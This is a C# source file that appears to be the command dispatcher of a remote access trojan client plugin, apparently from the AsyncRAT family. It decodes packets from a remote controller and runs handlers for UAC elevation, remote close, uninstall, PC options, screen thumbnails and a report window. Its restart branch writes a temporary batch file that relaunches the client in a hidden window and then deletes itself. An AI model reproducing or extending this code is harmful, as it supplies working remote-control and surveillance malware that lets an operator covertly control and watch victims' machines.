using Plugin.Handler;
using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Plugin
{
    public static class Packet
    {
        public static CancellationTokenSource ctsReportWindow;
        public static CancellationTokenSource ctsThumbnails;

        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "uac":
                        {
                            new HandleUAC();
                            Connection.Disconnected();
                            break;
                        }

                    case "close":
                        {
                            Methods.ClientExit();
                            Environment.Exit(0);
                            break;
                        }

                    case "restart":
                        {
                            Methods.ClientExit();
                            string batch = Path.GetTempFileName() + ".bat";
                            using (StreamWriter sw = new StreamWriter(batch))
                            {
                                sw.WriteLine("@echo off");
                                sw.WriteLine("timeout 3 > NUL");
                                sw.WriteLine("START " + "\"" + "\" " + "\"" + Application.ExecutablePath + "\"");
                                sw.WriteLine("CD " + Path.GetTempPath());
                                sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                            }
                            Process.Start(new ProcessStartInfo()
                            {
                                FileName = batch,
                                CreateNoWindow = true,
                                ErrorDialog = false,
                                UseShellExecute = false,
                                WindowStyle = ProcessWindowStyle.Hidden
                            });
                            Environment.Exit(0);
                            break;
                        }

                    case "uninstall":
                        {
                            new HandleUninstall();
                            break;
                        }

                    case "pcOptions":
                        {
                            new HandlePcOptions(unpack_msgpack.ForcePathObject("Option").AsString);
                            break;
                        }

                    case "thumbnails":
                        {
                            new HandleThumbnails();
                            break;
                        }

                    case "thumbnailsStop":
                        {
                            ctsThumbnails?.Cancel();
                            break;
                        }

                    case "reportWindow":
                        {
                            new HandleReportWindow(unpack_msgpack);
                            break;
                        }


                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }
        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}